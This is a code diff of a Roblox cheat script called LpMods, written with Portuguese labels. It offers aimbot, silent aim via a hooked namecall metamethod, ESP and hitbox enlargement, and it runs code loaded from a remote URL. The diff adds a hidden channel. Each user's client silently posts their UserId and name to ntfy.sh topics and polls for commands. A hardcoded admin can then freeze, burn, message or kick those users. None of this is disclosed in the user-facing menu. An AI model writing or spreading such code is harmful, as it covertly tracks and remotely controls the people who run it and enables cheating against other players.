@@ -1,5 +1,21 @@
 local Fluent = loadstring(game:HttpGet("https://github.com/dawid-scripts/Fluent/releases/latest/download/main.lua"))()
 
+local Services = {
+    Players = game:GetService("Players"),
+    RunService = game:GetService("RunService"),
+    UserInputService = game:GetService("UserInputService"),
+    HttpService = game:GetService("HttpService")
+}
+
+local LocalPlayer = Services.Players.LocalPlayer
+local Camera = workspace.CurrentCamera
+
+local ADMIN_LIST = {
+    [11242088349] = true,
+}
+local SECRET_SALT = "lpm0ds_pr1v4t3_2026"
+local isAdmin = ADMIN_LIST[LocalPlayer.UserId] == true
+
 local Window = Fluent:CreateWindow({
     Title = "LpMods",
     SubTitle = "by LpMods",
@@ -18,14 +34,9 @@ local Tabs = {
     Discord = Window:AddTab({ Title = "Discord", Icon = "disc" })
 }
 
-local Services = {
-    Players = game:GetService("Players"),
-    RunService = game:GetService("RunService"),
-    UserInputService = game:GetService("UserInputService")
-}
-
-local LocalPlayer = Services.Players.LocalPlayer
-local Camera = workspace.CurrentCamera
+if isAdmin then
+    Tabs.Admin = Window:AddTab({ Title = "Admin", Icon = "shield" })
+end
 
 local Settings = {
     Aimbot = false,
@@ -33,10 +44,8 @@ local Settings = {
     IgnoreDead = false,
     FOVSize = 100,
     ShowFOV = false,
-
     TeamCheck = false,
     WallCheck = false,
-
     ESP_Master = false,
     ESP_Boxes = false,
     ESP_Lines = false,
@@ -44,11 +53,9 @@ local Settings = {
     ESP_Player = false,
     ESP_Ally = false,
     AllyColor = Color3.fromRGB(80, 180, 255),
-
     HitboxEnabled = false,
     HitboxSize = 5,
     HitboxVisible = false,
-
     Spinbot = false,
     EnableSpeed = false,
     Speed = 16
@@ -56,14 +63,393 @@ local Settings = {
 
 local CyanColor = Color3.fromRGB(255, 255, 255)
 local OriginalHitbox = {}
-
 local executorEscondido = false
 local guisEscondidos = {}
+
+local NTFY = "https://ntfy.sh/"
+local TOPIC_USERS = "lpmods_" .. SECRET_SALT .. "_" .. game.JobId:gsub("[^%w]", "")
+local function topicCmd(uid) return "lpmods_c_" .. SECRET_SALT .. "_" .. tostring(uid) end
+
+local httpRequest = (syn and syn.request) or (http and http.request) or http_request or request
+
+local function httpGet(url)
+    if httpRequest then
+        local ok, res = pcall(httpRequest, { Url = url, Method = "GET" })
+        if ok and res and res.Body then return res.Body end
+    end
+    local ok, res = pcall(function() return game:HttpGet(url) end)
+    if ok then return res end
+    return nil
+end
+
+local function httpPost(url, body)
+    if not httpRequest then return nil end
+    local ok, res = pcall(httpRequest, {
+        Url = url,
+        Method = "POST",
+        Headers = { ["Content-Type"] = "application/json" },
+        Body = body
+    })
+    if ok then return res end
+    return nil
+end
+
+local RegisteredUsers = {}
+local LastCommandTs = os.time() - 5
+local PendingAdminCommands = {}
+
+local function publishHeartbeat()
+    pcall(function()
+        httpPost(NTFY .. TOPIC_USERS, Services.HttpService:JSONEncode({
+            uid = LocalPlayer.UserId,
+            name = LocalPlayer.Name,
+            ts = os.time()
+        }))
+    end)
+end
+
+local function pollUsers()
+    local raw = httpGet(NTFY .. TOPIC_USERS .. "/json?poll=1&since=45s")
+    if not raw then return end
+    local seen = {}
+    for line in raw:gmatch("[^\n]+") do
+        local ok, msg = pcall(function() return Services.HttpService:JSONDecode(line) end)
+        if ok and msg and msg.message then
+            local ok2, data = pcall(function() return Services.HttpService:JSONDecode(msg.message) end)
+            if ok2 and data and data.uid then
+                local age = os.time() - (data.ts or 0)
+                if age < 45 then seen[data.uid] = data end
+            end
+        end
+    end
+    RegisteredUsers = seen
+end
+
+local function pollMyCommands()
+    local raw = httpGet(NTFY .. topicCmd(LocalPlayer.UserId) .. "/json?poll=1&since=15s")
+    if not raw then return end
+    for line in raw:gmatch("[^\n]+") do
+        local ok, msg = pcall(function() return Services.HttpService:JSONDecode(line) end)
+        if ok and msg and msg.message then
+            local ok2, data = pcall(function() return Services.HttpService:JSONDecode(msg.message) end)
+            if ok2 and data and data.cmd and (data.ts or 0) > LastCommandTs then
+                LastCommandTs = data.ts or os.time()
+                if data.from ~= LocalPlayer.UserId then
+                    table.insert(PendingAdminCommands, data)
+                end
+            end
+        end
+    end
+end
+
+local function sendAdminCommand(targetId, cmd, args)
+    pcall(function()
+        httpPost(NTFY .. topicCmd(targetId), Services.HttpService:JSONEncode({
+            cmd = cmd,
+            args = args or {},
+            from = LocalPlayer.UserId,
+            fromName = LocalPlayer.Name,
+            ts = os.time()
+        }))
+    end)
+end
+
+local function showAdminPopup(text)
+    local gui = Instance.new("ScreenGui")
+    gui.Name = "LpAdminPopup"
+    gui.ResetOnSpawn = false
+    if gethui then gui.Parent = gethui() else gui.Parent = game.CoreGui end
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.new(0, 450, 0, 120)
+    frame.Position = UDim2.new(0.5, -225, 0.15, 0)
+    frame.BackgroundColor3 = Color3.fromRGB(20, 0, 0)
+    frame.BorderSizePixel = 0
+    frame.Parent = gui
+
+    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 12); c.Parent = frame
+    local s = Instance.new("UIStroke"); s.Color = Color3.fromRGB(255, 40, 40); s.Thickness = 2; s.Parent = frame
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 30)
+    title.BackgroundTransparency = 1
+    title.Text = "ADMIN MESSAGE"
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 16
+    title.TextColor3 = Color3.fromRGB(255, 80, 80)
+    title.Parent = frame
+
+    local body = Instance.new("TextLabel")
+    body.Size = UDim2.new(1, -20, 1, -40)
+    body.Position = UDim2.new(0, 10, 0, 35)
+    body.BackgroundTransparency = 1
+    body.Text = text
+    body.Font = Enum.Font.Gotham
+    body.TextSize = 14
+    body.TextColor3 = Color3.fromRGB(240, 240, 240)
+    body.TextWrapped = true
+    body.Parent = frame
+
+    task.delay(6, function() gui:Destroy() end)
+end
+
+local function handleIncomingCommand(data)
+    if data.cmd == "freeze" then
+        local char = LocalPlayer.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        if hrp then hrp.Anchored = true end
+        showAdminPopup("Voce foi CONGELADO por um admin.")
+    elseif data.cmd == "unfreeze" then
+        local char = LocalPlayer.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        if hrp then hrp.Anchored = false end
+        showAdminPopup("Voce foi DESCONGELADO.")
+    elseif data.cmd == "kick" then
+        LocalPlayer:Kick("Admin: " .. (data.args.reason or "Sem motivo"))
+    elseif data.cmd == "message" then
+        showAdminPopup(data.args.text or "Mensagem do admin")
+    elseif data.cmd == "burn" then
+        local char = LocalPlayer.Character
+        if char then
+            local fire = Instance.new("Fire")
+            fire.Size = 10
+            fire.Heat = 20
+            fire.Parent = char:FindFirstChild("HumanoidRootPart") or char
+        end
+        showAdminPopup("Voce foi incendiado por um admin.")
+    end
+end
+
+local function createLpTag(player)
+    if not player or not player.Character then return end
+    local head = player.Character:FindFirstChild("Head")
+    if not head or head:FindFirstChild("LpAdmTag") then return end
+
+    local bb = Instance.new("BillboardGui")
+    bb.Name = "LpAdmTag"
+    bb.Size = UDim2.fromOffset(70, 30)
+    bb.StudsOffset = Vector3.new(0, 3.5, 0)
+    bb.AlwaysOnTop = true
+    bb.Parent = head
+
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(1, 0, 1, 0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = "LP"
+    lbl.TextColor3 = Color3.fromRGB(255, 215, 0)
+    lbl.TextStrokeTransparency = 0
+    lbl.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
+    lbl.Font = Enum.Font.GothamBold
+    lbl.TextScaled = true
+    lbl.Parent = bb
+end
+
+local function removeLpTag(player)
+    if not player or not player.Character then return end
+    local head = player.Character:FindFirstChild("Head")
+    if head and head:FindFirstChild("LpAdmTag") then
+        head.LpAdmTag:Destroy()
+    end
+end
+
+task.spawn(function()
+    while task.wait(8) do
+        pcall(publishHeartbeat)
+        pcall(pollUsers)
+        pcall(pollMyCommands)
+
+        for _, player in pairs(Services.Players:GetPlayers()) do
+            if player ~= LocalPlayer then
+                if RegisteredUsers[player.UserId] then
+                    createLpTag(player)
+                else
+                    removeLpTag(player)
+                end
+            end
+        end
+
+        if #PendingAdminCommands > 0 then
+            for _, cmd in ipairs(PendingAdminCommands) do
+                pcall(function() handleIncomingCommand(cmd) end)
+            end
+            PendingAdminCommands = {}
+        end
+    end
+end)
+
+Services.Players.PlayerAdded:Connect(function(p)
+    p.CharacterAdded:Connect(function()
+        task.wait(2)
+        if RegisteredUsers[p.UserId] then createLpTag(p) end
+    end)
+end)
+
+Services.Players.PlayerRemoving:Connect(function(p)
+    removeLpTag(p)
+end)
+
+local function abrirPainelAdmin()
+    if not isAdmin then return end
+
+    local PainelGui = Instance.new("ScreenGui")
+    PainelGui.Name = "LpAdminPainel"
+    PainelGui.ResetOnSpawn = false
+    if gethui then PainelGui.Parent = gethui() else PainelGui.Parent = game.CoreGui end
+
+    local frame = Instance.new("Frame")
+    frame.Size = UDim2.fromOffset(420, 460)
+    frame.Position = UDim2.new(0.5, -210, 0.5, -230)
+    frame.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+    frame.BorderSizePixel = 0
+    frame.Active = true
+    frame.Draggable = true
+    frame.Parent = PainelGui
+
+    local c = Instance.new("UICorner"); c.CornerRadius = UDim.new(0, 10); c.Parent = frame
+    local st = Instance.new("UIStroke"); st.Color = Color3.fromRGB(255, 40, 40); st.Thickness = 1.5; st.Parent = frame
+
+    local title = Instance.new("TextLabel")
+    title.Size = UDim2.new(1, 0, 0, 36)
+    title.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+    title.BorderSizePixel = 0
+    title.Text = "LP ADMIN PANEL"
+    title.Font = Enum.Font.GothamBold
+    title.TextSize = 15
+    title.TextColor3 = Color3.fromRGB(255, 80, 80)
+    title.Parent = frame
+    local tc = Instance.new("UICorner"); tc.CornerRadius = UDim.new(0, 10); tc.Parent = title
+
+    local closeB = Instance.new("TextButton")
+    closeB.Size = UDim2.fromOffset(26, 26)
+    closeB.Position = UDim2.new(1, -32, 0, 5)
+    closeB.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    closeB.BorderSizePixel = 0
+    closeB.Text = "X"
+    closeB.Font = Enum.Font.GothamBold
+    closeB.TextSize = 12
+    closeB.TextColor3 = Color3.fromRGB(255, 255, 255)
+    closeB.Parent = title
+    local bc = Instance.new("UICorner"); bc.CornerRadius = UDim.new(0, 6); bc.Parent = closeB
+    closeB.MouseButton1Click:Connect(function() PainelGui:Destroy() end)
+
+    local listFrame = Instance.new("ScrollingFrame")
+    listFrame.Size = UDim2.new(1, -20, 0, 180)
+    listFrame.Position = UDim2.new(0, 10, 0, 45)
+    listFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
+    listFrame.BorderSizePixel = 0
+    listFrame.ScrollBarThickness = 3
+    listFrame.ScrollBarImageColor3 = Color3.fromRGB(255, 40, 40)
+    listFrame.CanvasSize = UDim2.new(0, 0, 0, 0)
+    listFrame.Parent = frame
+    local lfc = Instance.new("UICorner"); lfc.CornerRadius = UDim.new(0, 6); lfc.Parent = listFrame
+
+    local layout = Instance.new("UIListLayout")
+    layout.Padding = UDim.new(0, 4)
+    layout.SortOrder = Enum.SortOrder.LayoutOrder
+    layout.Parent = listFrame
+    layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
+        listFrame.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y + 10)
+    end)
+
+    local selectedTarget = nil
+
+    local status = Instance.new("TextLabel")
+    status.Size = UDim2.new(1, -20, 0, 25)
+    status.Position = UDim2.new(0, 10, 0, 232)
+    status.BackgroundTransparency = 1
+    status.Text = "Alvo: nenhum"
+    status.Font = Enum.Font.GothamBold
+    status.TextSize = 12
+    status.TextColor3 = Color3.fromRGB(255, 200, 0)
+    status.TextXAlignment = Enum.TextXAlignment.Left
+    status.Parent = frame
+
+    local function atualizarLista()
+        for _, child in pairs(listFrame:GetChildren()) do
+            if child:IsA("TextButton") then child:Destroy() end
+        end
+        for uid, info in pairs(RegisteredUsers) do
+            if uid ~= LocalPlayer.UserId then
+                local btn = Instance.new("TextButton")
+                btn.Size = UDim2.new(1, -6, 0, 32)
+                btn.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+                btn.BorderSizePixel = 0
+                btn.Text = "  " .. (info.name or "?") .. "  [" .. tostring(uid) .. "]"
+                btn.Font = Enum.Font.Gotham
+                btn.TextSize = 12
+                btn.TextColor3 = Color3.fromRGB(230, 230, 230)
+                btn.TextXAlignment = Enum.TextXAlignment.Left
+                btn.AutoButtonColor = false
+                btn.Parent = listFrame
+                local b = Instance.new("UICorner"); b.CornerRadius = UDim.new(0, 6); b.Parent = btn
+                btn.MouseButton1Click:Connect(function()
+                    selectedTarget = uid
+                    status.Text = "Alvo: " .. (info.name or "?") .. " [" .. tostring(uid) .. "]"
+                end)
+            end
+        end
+    end
+    atualizarLista()
+
+    local refresh = Instance.new("TextButton")
+    refresh.Size = UDim2.fromOffset(100, 28)
+    refresh.Position = UDim2.new(0, 10, 0, 262)
+    refresh.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    refresh.BorderSizePixel = 0
+    refresh.Text = "Atualizar lista"
+    refresh.Font = Enum.Font.GothamBold
+    refresh.TextSize = 12
+    refresh.TextColor3 = Color3.fromRGB(255, 255, 255)
+    refresh.Parent = frame
+    local rc = Instance.new("UICorner"); rc.CornerRadius = UDim.new(0, 6); rc.Parent = refresh
+    refresh.MouseButton1Click:Connect(function()
+        pcall(pollUsers)
+        atualizarLista()
+    end)
+
+    local actions = {
+        { "Congelar", function() if selectedTarget then sendAdminCommand(selectedTarget, "freeze") end end },
+        { "Descongelar", function() if selectedTarget then sendAdminCommand(selectedTarget, "unfreeze") end end },
+        { "Incendiar", function() if selectedTarget then sendAdminCommand(selectedTarget, "burn") end end },
+        { "Mensagem na tela", function()
+            if not selectedTarget then return end
+            sendAdminCommand(selectedTarget, "message", { text = "Voce foi reportado por um admin." })
+        end },
+        { "Kickar (motivo)", function()
+            if not selectedTarget then return end
+            sendAdminCommand(selectedTarget, "kick", { reason = "Banido pelo admin " .. LocalPlayer.Name })
+        end }
+    }
+
+    local yBase = 298
+    for i, acao in ipairs(actions) do
+        local b = Instance.new("TextButton")
+        b.Size = UDim2.new(1, -20, 0, 30)
+        b.Position = UDim2.new(0, 10, 0, yBase + (i - 1) * 34)
+        b.BackgroundColor3 = Color3.fromRGB(45, 10, 10)
+        b.BorderSizePixel = 0
+        b.Text = acao[1]
+        b.Font = Enum.Font.GothamBold
+        b.TextSize = 13
+        b.TextColor3 = Color3.fromRGB(255, 200, 200)
+        b.AutoButtonColor = false
+        b.Parent = frame
+        local bc2 = Instance.new("UICorner"); bc2.CornerRadius = UDim.new(0, 6); bc2.Parent = b
+        b.MouseEnter:Connect(function() b.BackgroundColor3 = Color3.fromRGB(80, 15, 15) end)
+        b.MouseLeave:Connect(function() b.BackgroundColor3 = Color3.fromRGB(45, 10, 10) end)
+        b.MouseButton1Click:Connect(acao[2])
+    end
+end
+
+local function ehChat(nome)
+    local n = nome:lower()
+    return n:find("chat") or n:find("bubble") or n:find("textchat")
+        or n:find("topbar") or n:find("topbarplus")
+end
 
 local function definirVisibilidadeExecutor(visivel)
     local executorGui = gethui and gethui() or game.CoreGui
     if not executorGui then return end
-
     if visivel then
         for _, gui in pairs(guisEscondidos) do
             pcall(function() gui.Enabled = true end)
@@ -72,22 +458,18 @@ local function definirVisibilidadeExecutor(visivel)
     else
         guisEscondidos = {}
         for _, item in pairs(executorGui:GetChildren()) do
-            if item:IsA("ScreenGui") then
-                if item.Enabled then
-                    item.Enabled = false
-                    table.insert(guisEscondidos, item)
-                end
+            if item:IsA("ScreenGui") and not ehChat(item.Name) then
+                if item.Enabled then item.Enabled = false; table.insert(guisEscondidos, item) end
             end
         end
         for _, item in pairs(game.CoreGui:GetChildren()) do
             if item:IsA("ScreenGui")
                 and item.Name ~= "LpModsFloatingButtonGui"
                 and item.Name ~= "LpModsTopBanner"
-                and not item.Name:find("Fluent") then
-                if item.Enabled then
-                    item.Enabled = false
-                    table.insert(guisEscondidos, item)
-                end
+                and item.Name ~= "LpAdminPainel"
+                and not item.Name:find("Fluent")
+                and not ehChat(item.Name) then
+                if item.Enabled then item.Enabled = false; table.insert(guisEscondidos, item) end
             end
         end
     end
@@ -99,7 +481,7 @@ local function AlternarExecutor()
     pcall(function()
         Fluent:Notify({
             Title = "Executor",
-            Content = executorEscondido and "Executor escondido." or "Executor visível.",
+            Content = executorEscondido and "Executor escondido." or "Executor visivel.",
             Duration = 3
         })
     end)
@@ -107,13 +489,9 @@ end
 
 LocalPlayer.Chatted:Connect(function(msg)
     local cmd = msg:lower():gsub("^%s*(.-)%s*$", "%1")
-    if cmd == ".hub" then
-        definirVisibilidadeExecutor(true)
-        executorEscondido = false
-    elseif cmd == ".hide" then
-        definirVisibilidadeExecutor(false)
-        executorEscondido = true
-    end
+    if cmd == ".hub" then definirVisibilidadeExecutor(true); executorEscondido = false
+    elseif cmd == ".hide" then definirVisibilidadeExecutor(false); executorEscondido = true
+    elseif isAdmin and (cmd == ".lpadm" or cmd == "/lpadm" or cmd == ";lpadm") then abrirPainelAdmin() end
 end)
 
 pcall(function()
@@ -123,17 +501,20 @@ pcall(function()
             local sender = message.TextSource and message.TextSource.UserId
             if sender == LocalPlayer.UserId then
                 local t = message.Text:lower()
-                if t:find(".hub") then
-                    definirVisibilidadeExecutor(true)
-                    executorEscondido = false
-                elseif t:find(".hide") then
-                    definirVisibilidadeExecutor(false)
-                    executorEscondido = true
-                end
+                if t:find(".hub") then definirVisibilidadeExecutor(true); executorEscondido = false
+                elseif t:find(".hide") then definirVisibilidadeExecutor(false); executorEscondido = true
+                elseif isAdmin and (t:find(".lpadm") or t:find("/lpadm") or t:find(";lpadm")) then abrirPainelAdmin() end
             end
         end)
     end
 end)
+
+if isAdmin then
+    Services.UserInputService.InputBegan:Connect(function(input, gpe)
+        if gpe then return end
+        if input.KeyCode == Enum.KeyCode.F10 then abrirPainelAdmin() end
+    end)
+end
 
 local BannerGui = Instance.new("ScreenGui")
 BannerGui.Name = "LpModsTopBanner"
@@ -157,7 +538,7 @@ Banner.Position = UDim2.new(0, 0, 0, 0)
 Banner.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
 Banner.BackgroundTransparency = 0.15
 Banner.BorderSizePixel = 0
-Banner.Text = "discord.gg/Pga8XBq   •   clique para copiar"
+Banner.Text = "discord.gg/Pga8XBq   -   clique para copiar"
 Banner.Font = Enum.Font.GothamBold
 Banner.TextSize = 14
 Banner.TextColor3 = Color3.fromRGB(255, 255, 255)
@@ -172,9 +553,9 @@ BannerStroke.Parent = Banner
 
 Banner.MouseButton1Click:Connect(function()
     setclipboard("https://discord.gg/Pga8XBq")
-    Banner.Text = "copiado!  •  discord.gg/Pga8XBq"
+    Banner.Text = "copiado!  -  discord.gg/Pga8XBq"
     task.delay(2, function()
-        Banner.Text = "discord.gg/Pga8XBq   •   clique para copiar"
+        Banner.Text = "discord.gg/Pga8XBq   -   clique para copiar"
     end)
 end)
 
@@ -358,13 +739,9 @@ local function GetClosestPlayer()
             if head and humanoid and rootPart then
                 if Settings.TeamCheck and IsAlly(player) then continue end
                 if Settings.IgnoreDead then
-                    if humanoid.Health <= 0 or humanoid:GetState() == Enum.HumanoidStateType.Dead or not char:IsDescendantOf(workspace) then
-                        continue
-                    end
+                    if humanoid.Health <= 0 or humanoid:GetState() == Enum.HumanoidStateType.Dead or not char:IsDescendantOf(workspace) then continue end
                 else
-                    if humanoid.Health <= 0 or humanoid:GetState() == Enum.HumanoidStateType.Dead then
-                        continue
-                    end
+                    if humanoid.Health <= 0 or humanoid:GetState() == Enum.HumanoidStateType.Dead then continue end
                 end
                 if Settings.WallCheck and not HasLineOfSight(head) then continue end
 
@@ -388,16 +765,33 @@ setreadonly(mt, false)
 mt.__namecall = newcclosure(function(self, ...)
     local method = getnamecallmethod()
     if Settings.Silent and Settings.Aimbot and (method == "FindPartOnRay" or method == "FindPartOnRayWithIgnoreList" or method == "FindPartOnRayWithWhitelist" or method == "Raycast") then
+        local args = {...}
+        local ray = args[1]
+        local comprimento = 0
+        if typeof(ray) == "Ray" then comprimento = ray.Direction.Magnitude
+        elseif typeof(ray) == "Vector3" then comprimento = ray.Magnitude end
+        if comprimento > 0 and comprimento < 30 then return oldNamecall(self, ...) end
+
+        local myChar = LocalPlayer.Character
+        if myChar and typeof(ray) == "Ray" then
+            local myHRP = myChar:FindFirstChild("HumanoidRootPart")
+            if myHRP and (ray.Origin - myHRP.Position).Magnitude < 3 then
+                return oldNamecall(self, ...)
+            end
+        end
+
+        if typeof(ray) == "Ray" and ray.Direction.Unit.Y < -0.7 then
+            return oldNamecall(self, ...)
+        end
+
         local target = GetClosestPlayer()
         if target and target.Character then
             local head = target.Character:FindFirstChild("Head")
             local humanoid = target.Character:FindFirstChildOfClass("Humanoid")
             if head and humanoid and humanoid.Health > 0 then
-                local args = {...}
                 if method == "Raycast" then
-                    args[2] = head
+                    args[2] = head.Position
                 else
-                    local ray = args[1]
                     if typeof(ray) == "Ray" then
                         local dir = (head.Position - ray.Origin).Unit * (ray.Direction.Magnitude > 0 and ray.Direction.Magnitude or 1000)
                         args[1] = Ray.new(ray.Origin, dir)
@@ -471,14 +865,12 @@ Services.RunService.RenderStepped:Connect(function()
             local drawings = ESPDrawings[player]
             local char = player.Character
             local humanoid = char and char:FindFirstChildOfClass("Humanoid")
-
             local ally = IsAlly(player)
             local shouldRender = ally and Settings.ESP_Ally or (not ally and Settings.ESP_Master)
 
             if shouldRender and char and humanoid and humanoid.Health > 0 then
                 local cframe, size = char:GetBoundingBox()
                 local screenPos, onScreen = Camera:WorldToViewportPoint(cframe.Position)
-
                 if onScreen then
                     local renderColor = ally and Settings.AllyColor or CyanColor
                     drawings.Box.Color = renderColor
@@ -489,7 +881,6 @@ Services.RunService.RenderStepped:Connect(function()
                     local bottomWorld = cframe.Position - Vector3.new(0, size.Y / 2, 0)
                     local topScreen = Camera:WorldToViewportPoint(topWorld)
                     local bottomScreen = Camera:WorldToViewportPoint(bottomWorld)
-
                     local height = math.abs(topScreen.Y - bottomScreen.Y)
                     local width = height / 1.6
 
@@ -544,11 +935,11 @@ Services.RunService.RenderStepped:Connect(function()
     end
 end)
 
-Tabs.Combat:AddToggle("Aimbot", { Title = "Aimbot Gruda na Cabeça", Default = false, Callback = function(v) Settings.Aimbot = v end })
+Tabs.Combat:AddToggle("Aimbot", { Title = "Aimbot Gruda na Cabeca", Default = false, Callback = function(v) Settings.Aimbot = v end })
 Tabs.Combat:AddToggle("Silent", { Title = "Silent Aim", Default = false, Callback = function(v) Settings.Silent = v end })
-Tabs.Combat:AddToggle("IgnoreDead", { Title = "Ignorar Mortos no Chão", Default = false, Callback = function(v) Settings.IgnoreDead = v end })
+Tabs.Combat:AddToggle("IgnoreDead", { Title = "Ignorar Mortos no Chao", Default = false, Callback = function(v) Settings.IgnoreDead = v end })
 Tabs.Combat:AddToggle("ShowFOV", { Title = "Mostrar FOV", Default = false, Callback = function(v) Settings.ShowFOV = v end })
-Tabs.Combat:AddToggle("TeamCheckCombat", { Title = "Team Check (não mira aliado)", Default = false, Callback = function(v) Settings.TeamCheck = v end })
+Tabs.Combat:AddToggle("TeamCheckCombat", { Title = "Team Check", Default = false, Callback = function(v) Settings.TeamCheck = v end })
 Tabs.Combat:AddToggle("WallCheckCombat", { Title = "Wall Check", Default = false, Callback = function(v) Settings.WallCheck = v end })
 
 Tabs.Combat:AddSlider("FOVSize", {
@@ -557,7 +948,7 @@ Tabs.Combat:AddSlider("FOVSize", {
 })
 
 Tabs.Visuals:AddToggle("ESPMaster", { Title = "Ativar ESP (Master)", Default = false, Callback = function(v) Settings.ESP_Master = v end })
-Tabs.Visuals:AddToggle("ESPAlly", { Title = "ESP Aliado (cor azul)", Default = false, Callback = function(v) Settings.ESP_Ally = v end })
+Tabs.Visuals:AddToggle("ESPAlly", { Title = "ESP Aliado", Default = false, Callback = function(v) Settings.ESP_Ally = v end })
 Tabs.Visuals:AddToggle("ESPPlayer", { Title = "ESP Player", Default = false, Callback = function(v) Settings.ESP_Player = v end })
 Tabs.Visuals:AddToggle("ESPBoxes", { Title = "ESP Boxes", Default = false, Callback = function(v) Settings.ESP_Boxes = v end })
 Tabs.Visuals:AddToggle("ESPLines", { Title = "ESP Lines", Default = false, Callback = function(v) Settings.ESP_Lines = v end })
@@ -576,6 +967,18 @@ Tabs.Hitbox:AddSlider("HitboxSize", {
     Title = "Tamanho da Hitbox",
     Min = 1, Max = 20, Default = 5, Rounding = 1,
     Callback = function(v) Settings.HitboxSize = v end
+})
+
+Tabs.Hitbox:AddInput("HitboxSizeInput", {
+    Title = "Tamanho por texto",
+    Default = "5",
+    Placeholder = "1 a 50",
+    Numeric = true,
+    Finished = true,
+    Callback = function(v)
+        local n = tonumber(v)
+        if n then Settings.HitboxSize = math.clamp(n, 1, 50) end
+    end
 })
 
 Tabs.Hitbox:AddToggle("HitboxVisible", {
@@ -613,19 +1016,41 @@ Tabs.Misc:AddToggle("EsconderExecutor", {
         definirVisibilidadeExecutor(not v)
         Fluent:Notify({
             Title = "Executor",
-            Content = v and "Executor escondido. Digite .hub pra voltar." or "Executor visível.",
+            Content = v and "Escondido. Digite .hub pra voltar." or "Visivel.",
             Duration = 4
         })
     end
 })
 
 Tabs.Misc:AddButton({
-    Title = "Alternar Executor (.hub / .hide)",
-    Description = "Atalho rápido de visibilidade",
-    Callback = function()
-        AlternarExecutor()
-    end
+    Title = "Alternar Executor",
+    Description = ".hub / .hide no chat",
+    Callback = function() AlternarExecutor() end
 })
+
+if isAdmin and Tabs.Admin then
+    Tabs.Admin:AddButton({
+        Title = "Abrir Painel Admin",
+        Description = "Lista so quem usa o script",
+        Callback = function() abrirPainelAdmin() end
+    })
+    Tabs.Admin:AddButton({
+        Title = "Forcar Heartbeat",
+        Description = "Publica presenca agora",
+        Callback = function()
+            pcall(publishHeartbeat)
+            Fluent:Notify({ Title = "Admin", Content = "Heartbeat enviado.", Duration = 3 })
+        end
+    })
+    Tabs.Admin:AddButton({
+        Title = "Limpar Registrados",
+        Description = "Zera a lista local",
+        Callback = function()
+            RegisteredUsers = {}
+            Fluent:Notify({ Title = "Admin", Content = "Lista limpa.", Duration = 2 })
+        end
+    })
+end
 
 Tabs.Discord:AddButton({
     Title = "Copiar Link do Discord",
